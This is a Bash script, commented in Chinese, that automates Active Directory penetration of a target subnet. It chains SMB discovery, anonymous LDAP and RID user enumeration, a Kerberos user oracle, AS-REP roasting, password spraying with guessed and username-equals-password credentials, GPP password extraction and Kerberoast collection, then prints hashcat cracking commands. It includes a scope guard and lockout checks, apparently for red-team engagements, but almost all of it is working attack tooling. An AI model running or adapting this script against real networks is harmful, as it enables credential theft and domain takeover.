#!/usr/bin/env bash
# autopwn.sh v3 — 通用 AD 渗透自动化(多源兜底·服务感知·新手友好)
#
# 用法: autopwn.sh <网段> [--proxy] [--project NAME]
#
# 设计原则:
#   • 每步多路径,单路径失败自动切换
#   • 服务感知(LDAP/SMB/Kerberos/WinRM 按需选择)
#   • 全程输出新手可读的"发现→下一步"提示
#   • 不自动执行高危操作(中继/利用),只发现+建议
set -uo pipefail
VERSION="3.0"
NET="${1:?用法: $0 <网段CIDR> [--proxy] [--project NAME]}"; shift 2>/dev/null || true
PROXY=""; PROJECT=""
while [ $# -gt 0 ]; do
    case "$1" in
        --proxy) PROXY="proxychains4 -q" ;;
        --project) PROJECT="$2"; shift ;;
    esac; shift
done
source "$(dirname "$(readlink -f "$0")")/lib/common.sh"
source "$(dirname "$(readlink -f "$0")")/lib/recon.sh"
source "$(dirname "$(readlink -f "$0")")/lib/project.sh"
source "$(dirname "$(readlink -f "$0")")/lib/state.sh"
source "$(dirname "$(readlink -f "$0")")/lib/scope.sh"
# --project 指定时让 resolve_project 全程指向该项目(creds.csv/notes.md/hashqueue/state.json 落点)
[ -n "$PROJECT" ] && [ -d "$HOME/tools/projects/$PROJECT" ] && export PROJ_DIR="$HOME/tools/projects/$PROJECT"
# ─── 交战范围护栏:项目激活时 scope.txt 之外的目标直接中止(改范围请编辑 scope.txt) ───
scope_check "$NET" || exit 1
RUNID=$(date +%Y%m%d-%H%M%S)
L=$(mktmpdir apn); mkdir -p "$L"/{p1,p2,p3,p4}

# ─── 检查点(项目可解析时生效;无项目则恢复永不命中、落盘静默跳过) ───

# phase_restore <P名> <目标目录> — 检查点命中且产物目录存在 → 拷回产物并返回 0(调用方跳过该相位)
phase_restore() {
    local pn="$1" dir="$2" art
    state_phase_check "$pn" || return 1
    art=$(state_phase_artifact "$pn")
    [ -n "$art" ] && [ -d "$art" ] || return 1
    cp -r "$art/." "$dir/" 2>/dev/null || true
    ok "$pn 已完成(检查点命中),跳过 — 复用产物: $art"
    return 0
}

# phase_save <P名> <产物目录> — 相位成功后拷产物到 <项目>/apn-$RUNID/pN 并写检查点
phase_save() {
    local pn="$1" dir="$2" proj dest
    proj=$(resolve_project) || return 0
    [ -n "$proj" ] || return 0
    dest="$proj/apn-$RUNID/$(basename "$dir")"
    mkdir -p "$dest" && cp -r "$dir/." "$dest/" 2>/dev/null || true
    state_phase_mark "$pn" "$dest"
}

echo "╔══════════════════════════════════════════╗"
echo "║  🗡️ AutoPwn v$VERSION — 通用 AD 渗透编排   ║"
echo "║  目标: $NET                              ║"
echo "╚══════════════════════════════════════════╝"



# 长网络操作超时:BASE 秒 × TIMEOUT_MULT(netcheck 浮点倍数,awk 归一化为 int,下限 30s)
# P1 发现阶段固定 x1(发现必须快);P1 后按真实 DC 实测重算
TIMEOUT_MULT=1
tmo() { awk -v m="${TIMEOUT_MULT:-1}" -v b="$1" 'BEGIN{v=int(b*m); print (v<30?30:v)}'; }

# ═══ P1: 发现(多协议探测) ═══
echo -e "\n${Y}━━━ P1: 网络发现 ━━━${N}"
if phase_restore P1 "$L/p1"; then
    # 恢复路径:从落盘产物重建后续相位依赖的变量
    HOSTS=$(wc -l < "$L/p1/smb.txt" 2>/dev/null || echo 0)
    DOMAINS=$(cat "$L/p1/domains.txt" 2>/dev/null)
    DCS=$(cat "$L/p1/dcs.txt" 2>/dev/null | tr '\n' ' ' | sed 's/ *$//')
    FIRST_DC=$(echo $DCS | awk '{print $1}')
    FIRST_DOMAIN=$(echo "$DOMAINS" | head -1)
    RELAY=$(wc -l < "$L/p1/relay.txt" 2>/dev/null || echo 0)
    SERVICES=$(cat "$L/p1/services.txt" 2>/dev/null || echo 0)
else
    $PROXY nxc smb "$NET" -u '' -p '' --gen-relay-list "$L/p1/relay.txt" 2>/dev/null | grep '\[\*\]' > "$L/p1/smb.txt" || true
    HOSTS=$(wc -l < "$L/p1/smb.txt" 2>/dev/null || echo 0)
    [ "$HOSTS" -eq 0 ] && { no "无可达主机"; exit 1; }
    ok "$HOSTS 台主机"

    DOMAINS=$(grep -oP 'domain:\S+' "$L/p1/smb.txt" | sed 's/domain://;s/[()]//g' | sort -u | grep -v '^$\|^-\|^\d' | grep '\.')  # 真域名必含点;过滤 DESKTOP-* 等工作组伪域(否则 Kerberos 探测挂死)
    ok "域名: $(echo $DOMAINS | tr '\n' ' ')"

    # DC = 签名强制 + Kerberos 88
    DCS=""; for H in $(grep 'signing:True' "$L/p1/smb.txt" | awk '{print $2}'); do
        timeout "$(tmo 60)" $PROXY nmap -Pn -p 88 --open -T4 "$H" 2>/dev/null | grep -q 'open' && DCS="$DCS $H"
    done
    [ -z "$DCS" ] && DCS=$(head -3 "$L/p1/smb.txt" | awk '{print $2}')
    ok "域控: $DCS"
    FIRST_DC=$(echo $DCS | awk '{print $1}')
    FIRST_DOMAIN=$(echo "$DOMAINS" | head -1)
    RELAY=$(wc -l < "$L/p1/relay.txt" 2>/dev/null || echo 0)

    # relay 清单落到项目 loot 固定路径(relay-smb 工具与后续链直接消费)
    RPROJ="$(resolve_project 2>/dev/null || true)"
    [ -n "$RPROJ" ] && cp "$L/p1/relay.txt" "$RPROJ/loot/relay-list.txt" 2>/dev/null || true

    # 服务面(nmap 快扫 DC;输出留存供 state 登记端口)
    go "服务面探测..."
    DC_NMAP=$(timeout "$(tmo 120)" $PROXY nmap -Pn -p 88,389,636,5985,1433,9389,445 --open -T4 "$FIRST_DC" 2>/dev/null || true)
    SERVICES=$(echo "$DC_NMAP" | grep -c 'open' || echo 0)
    ok "关键服务: $SERVICES 个端口"

    # 派生事实落盘,供检查点恢复时重建变量
    printf '%s\n' $DOMAINS > "$L/p1/domains.txt"
    printf '%s\n' $DCS > "$L/p1/dcs.txt"
    echo "$SERVICES" > "$L/p1/services.txt"
    phase_save P1 "$L/p1"
fi

# ─── 网络质量检测(探真实 DC 的 445,不探 CIDR 基址——基址常是虚拟网关机,会误报高延迟) ───
go "网络质量检测(目标 DC $FIRST_DC)..."
NC_RESULT=$($HOME/tools/bin/netcheck.sh "$FIRST_DC" 445 2>/dev/null || echo "跳过")
echo "  $NC_RESULT"
# 安全解析 netcheck 的 export 行(白名单键,不 eval)
while IFS='=' read -r k v; do
    case "$k" in NET_QUALITY|NET_RTT|NET_TIMEOUT_MULT) export "$k=$v" ;; esac
done < <(echo "$NC_RESULT" | sed -n 's/^export //p' | tr ' ' '\n')
TIMEOUT_MULT=${NET_TIMEOUT_MULT:-1}
if [ "${NET_QUALITY:-good}" = "poor" ]; then
    echo -e "  ${Y}⚠️ 高延迟模式:超时 x${TIMEOUT_MULT},写操作可能失败${N}"
    echo -e "  ${Y}   建议: --proxy 或直连网段${N}"
fi

# ─── 主机清单 → state(fail-safe;恢复路径同样登记,state 内按 ip 合并去重) ───
# 首 DC 带 nmap 服务面端口(services 逗号分隔);所有 DC 标 role=dc
DC_PORTS=$(echo "${DC_NMAP:-}" | grep 'open' | awk -F/ '{print $1}' | paste -sd, 2>/dev/null || true)
for H in $(awk '{print $2}' "$L/p1/smb.txt" 2>/dev/null); do
    if echo " $DCS " | grep -qF " $H "; then
        if [ "$H" = "$FIRST_DC" ] && [ -n "$DC_PORTS" ]; then
            state_host_add "$H" role=dc "services=$DC_PORTS"
        else
            state_host_add "$H" role=dc
        fi
    else
        state_host_add "$H"
    fi
done

# ═══ P2: 用户发现(四级兜底) ═══
echo -e "\n${Y}━━━ P2: 用户名发现(多源兜底) ━━━${N}"
U="$L/p2/users.txt"
if phase_restore P2 "$L/p2"; then
    [ -f "$U" ] || touch "$U"
else
    > "$U"

    # 源0: 项目既有用户清单(历次侦察/gen-wordlists 沉淀,跨轮次复用)
    PROJ_U="$(resolve_project 2>/dev/null || true)"
    if [ -n "$PROJ_U" ]; then
        find "$PROJ_U" -maxdepth 3 -name 'users*.txt' -exec cat {} + 2>/dev/null | grep -oP '^[A-Za-z0-9_.-]+$' >> "$U" || true
        [ -s "$U" ] && ok "项目沉淀用户: $(sort -u "$U" | wc -l) 个"
    fi

    # 源1: LDAP 匿名(nxc)
    go "源1/4: LDAP 匿名枚举"
    for DC in $DCS; do
        for DOM in $DOMAINS; do
            $PROXY nxc ldap "$DC" -u '' -p '' -d "$DOM" --users 2>/dev/null \
                | grep -oP '\S+@\S+' | cut -d@ -f1 >> "$U" 2>/dev/null
        done
    done

    # 源2: SMB RID(逐台尝试)
    if [ $(sort -u "$U" | wc -l) -lt 3 ]; then
        go "源2/4: SMB RID 枚举"
        for DC in $DCS; do
            $PROXY nxc smb "$DC" -u '' -p '' --rid-brute 2>/dev/null >> "$L/p2/rid.txt"
        done
        # 兼容多种 nxc 输出格式
        grep -oP '\[\+\].*\s(\w[\w.\-]+)$' "$L/p2/rid.txt" 2>/dev/null | awk '{print $NF}' >> "$U" 2>/dev/null
        grep -oP '500:.*?\s(\S+)$' "$L/p2/rid.txt" 2>/dev/null | awk '{print $NF}' >> "$U" 2>/dev/null
    fi

    # 源3: Kerberos 用户枚举(不发认证,安全)
    if [ $(sort -u "$U" | wc -l) -lt 3 ]; then
        go "源3/4: Kerberos GetADUsers(匿名)"
        timeout "$(tmo 60)" $PROXY impacket-GetADUsers "$FIRST_DOMAIN/" -all -dc-ip "$FIRST_DC" 2>/dev/null >> "$L/p2/kusers.txt"
        grep -oP '^\s*\S+\s+(\S+)' "$L/p2/kusers.txt" 2>/dev/null | awk '{print $2}' >> "$U"
    fi

    # 源3b: Kerberos 用户预言机(GetNPUsers 区分存在/不存在)
    if [ $(sort -u "$U" | grep -cv '^\s*$') -lt 5 ]; then
        go "源3b: Kerberos 用户预言机"
        ORACLE_TMP="$L/p2/oracle.txt"
        for DOM in $DOMAINS; do
            DC=$(grep "$DOM" "$L/p1/smb.txt" | grep 'signing:True' | head -1 | awk '{print $2}')
            [ -z "$DC" ] && continue
            timeout "$(tmo 90)" $PROXY impacket-GetNPUsers "$DOM/" -usersfile "$U" -no-pass -dc-ip "$DC" > "$ORACLE_TMP" 2>&1
            grep "doesn't have" "$ORACLE_TMP" | grep -oP 'User \K\S+' >> "$U" 2>/dev/null
        done
    fi

    # 源4: 通用用户名(兜底)
    if [ $(sort -u "$U" | grep -cv '^\s*$') -lt 3 ]; then
        go "源4/4: 通用用户名模式(兜底)"
        cat >> "$U" << 'EOF'
administrator admin Administrator Admin guest service svc sql sqlsvc test user oracle backup exchange
EOF
    fi

    sort -u "$U" | grep -v '^\s*$\|^\$\|health\|mailbox\|krbtgt' > "$U.tmp" && mv "$U.tmp" "$U"
    phase_save P2 "$L/p2"
fi
UC=$(wc -l < "$U")
ok "用户候选: $UC 个"

# ═══ P3: 凭据获取(五路并发) ═══
echo -e "\n${Y}━━━ P3: 凭据获取 ━━━${N}"
C="$L/p3/creds.txt"
ASREP="$L/p3/asrep.txt"
if phase_restore P3 "$L/p3"; then
    [ -f "$C" ] || touch "$C"
    [ -f "$ASREP" ] || touch "$ASREP"
else
    > "$C"

    # 路A: AS-REP(无需凭据)
    go "路A: AS-REP Roast"
    > "$ASREP"
    for DOM in $DOMAINS; do
        DC=$(grep "$DOM" "$L/p1/smb.txt" | grep 'signing:True' | head -1 | awk '{print $2}')
        [ -z "$DC" ] && DC=$(grep "$DOM" "$L/p1/smb.txt" | head -1 | awk '{print $2}')
        timeout "$(tmo 90)" $PROXY impacket-GetNPUsers "$DOM/" -usersfile "$U" -no-pass -format hashcat -dc-ip "$DC" >> "$ASREP" 2>/dev/null
    done
    # AS-REP 哈希 → 项目 hashqueue(去重;无项目静默跳过)
    { grep '\$krb5asrep\$' "$ASREP" 2>/dev/null || true; } | hashqueue_add

    # 路B: 密码喷洒(自适应+限速)
    # 纵深防御:即使 P3 检查点丢失,tried 记录也阻止对同网段重复喷洒(锁定风险)
    if state_tried_check "autopwn:spray:$NET"; then
        go "路B: 该网段已喷洒过(state 记录),跳过"
    else
        go "路B: 密码喷洒(自适应)"
        COMPANY=$(company_root "$FIRST_DOMAIN")
        go "口令策略检查..."
        for DC in $DCS; do
            $PROXY nxc smb "$DC" -u 'test' -p 'test' --pass-pol 2>/dev/null | grep -E 'Lockout' | head -2
        done

        # 只做 2 个最可能口令的快速试探(每账号 1 次);完整节流喷洒用 spray-safe.sh(读 --pass-pol 限速)
        for PWD in "${COMPANY}@$(date +%Y)" "Password@123"; do
            for DC in $DCS; do
                for DOM in $DOMAINS; do
                    R=$(timeout "$(tmo 120)" $PROXY nxc smb "$DC" -u "$U" -p "$PWD" -d "$DOM" --no-bruteforce --continue-on-success 2>/dev/null | grep '\[+\]')
                    [ -n "$R" ] && { echo "$R" >> "$C"; ok "喷洒命中: $(echo "$R" | awk '{print $5,$6}')"; }
                done
            done
        done

        # 用户名=密码(高频漏洞)
        for DC in $DCS; do
            R=$(timeout "$(tmo 120)" $PROXY nxc smb "$DC" -u "$U" -p "$U" -d "$FIRST_DOMAIN" --no-bruteforce --continue-on-success 2>/dev/null | grep '\[+\]')
            [ -n "$R" ] && { echo "$R" >> "$C"; ok "用户名=密码: $(echo "$R" | awk '{print $5,$6}')"; }
        done
        state_tried_mark "autopwn:spray:$NET" 0

        # 喷洒命中 → 凭据台账 creds.csv(仅登记确含 域\用户:口令 的行)
        SC=$(wc -l < "$C" 2>/dev/null || echo 0)
        if [ "$SC" -gt 0 ]; then
            while IFS= read -r line; do
                CRED=$(echo "$line" | grep -oP '[A-Za-z0-9_.-]+\\[A-Za-z0-9_.$-]+:[^[:space:]]+' | head -1)
                [ -z "$CRED" ] && continue
                CDOM="${CRED%%\\*}"; CREST="${CRED#*\\}"; CUSER="${CREST%%:*}"; CPASS="${CREST#*:}"
                [ -n "$CUSER" ] && [ -n "$CPASS" ] && [ "$CPASS" != "$CREST" ] && \
                    cred_log 密码 "$CDOM\\$CUSER" "$CDOM" "$CPASS" "autopwn $NET 喷洒"
            done < "$C"
        fi
    fi

    # 路C: GPP(SYSVOL)
    go "路C: GPP 密码"
    for DOM in $DOMAINS; do
        DC=$(grep "$DOM" "$L/p1/smb.txt" | head -1 | awk '{print $2}')
        $PROXY impacket-Get-GPPPassword "$DOM/:@$DC" 2>/dev/null | grep -E 'password|UserName' >> "$L/p3/gpp.txt"
    done
    phase_save P3 "$L/p3"
fi
AC=$(grep krb5asrep "$ASREP" 2>/dev/null | wc -l)
[ "$AC" -gt 0 ] && ok "AS-REP 哈希 $AC 个" || no "无 AS-REP 可烤账户"
SC=$(wc -l < "$C" 2>/dev/null || echo 0)
[ "$SC" -gt 0 ] && ok "喷洒命中 $SC 条" || no "喷酒无命中"
GC=$(grep password "$L/p3/gpp.txt" 2>/dev/null | wc -l)
[ "$GC" -gt 0 ] && ok "GPP 密码 $GC 个" || no "无 GPP"

# ═══ P4: 深度情报(有凭据时自动) ═══
echo -e "\n${Y}━━━ P4: 深度情报 ━━━${N}"
FU=""; FP=""; KC=0; BH=""
# 喷洒命中 → 发现登记(网段级一条,state 按标题+主机去重;只记命中不声称 owned)
[ "$SC" -gt 0 ] && state_finding_add "有效凭据喷洒命中" 中 "autopwn-$RUNID" "$NET"
[ "$SC" -gt 0 ] && {
    # 与 creds 台账同款解析:域\用户:口令 → FU 取纯用户名(域由 FIRST_DOMAIN 单独传给 intel_collect)
    CRED1=$(head -1 "$C" | grep -oP '[A-Za-z0-9_.-]+\\[A-Za-z0-9_.$-]+:[^[:space:]]+' | head -1)
    [ -n "$CRED1" ] && { CREST="${CRED1#*\\}"; FU="${CREST%%:*}"; FP="${CREST#*:}"; }
}
# AS-REP 破解提示(不自动跑 hashcat)
[ "$AC" -gt 0 ] && {
    echo -e "  ${Y}💡 破解 AS-REP: hashcat -m 18200 $L/p3/asrep.txt rockyou.txt${N}"
    echo -e "  ${Y}   破解出密码后: autopwn-continue.sh <DC> <域名> <用户> <密码>${N}"
}

if phase_restore P4 "$L/p4"; then
    # 恢复路径:从落盘产物重建 KC/BH(供 P5 汇总)
    KC=$(grep krb5tgs "$L/p3/kerb.txt" 2>/dev/null | wc -l)
    BH=$(ls "$L"/p4/*bloodhound*.zip 2>/dev/null | tail -1)
else
    if [ -n "$FU" ] && [ -n "$FP" ]; then
        intel_collect "$FIRST_DC" "$FIRST_DOMAIN" "$FU" "$FP" "$L/p4" "$L/p3/kerb.txt" "$PROXY"
        # Kerberoast 哈希 → 项目 hashqueue(去重;无项目静默跳过)
        [ -f "$L/p3/kerb.txt" ] && { grep '\$krb5tgs\$' "$L/p3/kerb.txt" || true; } | hashqueue_add
    fi
    phase_save P4 "$L/p4"
fi

# ═══ P5: 汇总 ═══
echo -e "\n${Y}━━━ P5: 战果与建议 ━━━${N}"
echo ""
echo "╔═══════════════════════════════════════╗"
echo "║       📊 AutoPwn v$VERSION 战果          ║"
echo "╠═══════════════════════════════════════╣"
printf "║ 主机 %-3d │ DC %-2d │ 域 %-2d │ 用户 %-3d ║\n" "$HOSTS" "$(echo $DCS|wc -w)" "$(echo $DOMAINS|wc -w)" "$UC"
printf "║ AS-REP %-2d │ 喷洒 %-2d │ GPP %-2d │ 中继 %-2d ║\n" "$AC" "$SC" "$GC" "$RELAY"
[ "$KC" -gt 0 ] 2>/dev/null && printf "║ Kerberoast %-2d │ BH %-2s                ║\n" "$KC" "$([ -n "$BH" ] && echo ✓ || echo ✗)"
[ -n "$FU" ] && printf "║ 首凭据: %-30s ║\n" "$FIRST_DOMAIN\\$FU"
echo "╚═══════════════════════════════════════╝"

echo ""
echo "🔧 下一步(按优先级):"
PRIORITY=()
[ "$AC" -gt 0 ] && PRIORITY+=("破解 AS-REP: hashcat -m 18200 $L/p3/asrep.txt rockyou.txt")
[ "${KC:-0}" -gt 0 ] && PRIORITY+=("破解 Kerberoast: hashcat -m 13100 $L/p3/kerb.txt rockyou.txt")
[ "$RELAY" -gt 0 ] && PRIORITY+=("中继攻击: ~/tools/bin/console.sh → 执行台「中继矩阵」")
[ -n "$BH" ] && PRIORITY+=("BH 分析: http://127.0.0.1:8080 → Saved Queries")
[ -z "$FU" ] && [ "$AC" -gt 0 ] && PRIORITY+=("AS-REP 破出密码后: autopwn-continue.sh <DC> <域> <用户> <密码>")
PRIORITY+=("控制台一键: ~/tools/bin/console.sh(默认 http://127.0.0.1:8765) 77 工具/10 链")

i=1; for P in "${PRIORITY[@]}"; do
    echo "  $i. $P"; i=$((i+1))
done

echo ""
echo "产物: $L"
# 产物已随相位实时落入 <项目>/apn-$RUNID/pN(替代旧的尾部整拷 apn-<HHMM>,同分撞名互覆的 bug 随之消失)
APN_PROJ=$(resolve_project || true)
[ -n "$APN_PROJ" ] && [ -d "$APN_PROJ/apn-$RUNID" ] && ok "项目产物: $APN_PROJ/apn-$RUNID"

# 战果摘要 → 项目 notes.md(格式同 redops proj_note;无项目静默跳过)
proj_note "🗡️ AutoPwn $NET: 主机 $HOSTS / 用户 $UC / 凭据 $SC / AS-REP $AC / Kerberoast ${KC:-0} / BH $([ -n "$BH" ] && echo ✓ || echo ✗)"
